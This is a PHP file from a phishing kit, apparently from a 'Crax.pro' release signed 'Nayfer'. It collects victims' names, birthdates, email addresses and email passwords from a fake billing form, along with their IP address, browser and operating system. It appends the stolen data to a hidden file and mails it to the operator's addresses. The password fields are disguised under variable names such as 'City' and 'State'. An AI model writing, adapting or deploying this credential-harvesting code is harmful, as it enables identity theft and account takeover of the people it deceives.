<?php
/*
 ▄████▄   ██▀███   ▄▄▄      ▒██   ██▒      ██▓███   ██▀███   ▒█████  
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒▒ █ █ ▒░     ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░░  █   ░     ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██  ░ █ █ ▒      ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ▒██▒ ██▓ ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒ ░ ░▓ ░ ▒▓▒ ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ 
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░░   ░▒ ░ ░▒  ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ 
░          ░░   ░   ░   ▒    ░    ░   ░   ░░         ░░   ░ ░ ░ ░ ▒  
░ ░         ░           ░  ░ ░    ░    ░              ░         ░ ░  
░                                      ░                             
$$Nayfer
*/
session_start();

include("system.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$Firstname = $_SESSION['Firstname'] = $_POST['Firstname'];
$LastName = $_SESSION['LastName'] = $_POST['LastName'];
$birthdate = $_SESSION['birthdate'] = $_POST['birthdate'];
$AddressLine = $_SESSION['AddressLine'] = $_POST['txtEmailAddr'];
$City = $_SESSION['City'] = $_POST['PasswrodEmailAdress'];
$State = $_SESSION['State'] = $_POST['ConfirmPasswordEmailAdress'];

$emailtext ='<!DOCTYPE html>
<html lang="en">
<head>
</div><br> The Billing Address </div><br>

</div><br> First name   = '.$_SESSION["Firstname"].' </div><br>
</div><br> Last Name    = '.$_SESSION["LastName"].' </div><br>
</div><br> Date Of Birth   = '.$_SESSION["birthdate"].' </div><br>
</div><br> Email Address = '.$_SESSION["AddressLine"].' </div><br>
</div><br> Password     = '.$_SESSION["City"].' </div><br>
</div><br> Confirme Password = '.$_SESSION["State"].' </div><br>
****************
</div><br> System    =  '.$OS.'</div><br>
</div><br> Browser   = '.$browserTy_Version.' </div><br>
</div><br> Ip Address = '.$_SERVER["REMOTE_ADDR"].' </div><br>
</div><br> Date and Time = '.$InfoDATE.' </div><br>
';




include("sand_email.php"); 
include("function.php"); 

$f = fopen("../../azert14.php", "a");
	fwrite($f, $emailtext);


$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "NEW BILING Wu[".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: Nayfer" . "\r\n";
mail($yourmail, $subject, $emailtext, $headers);
mail($yourmail2, $subject, $emailtext, $headers);




?>



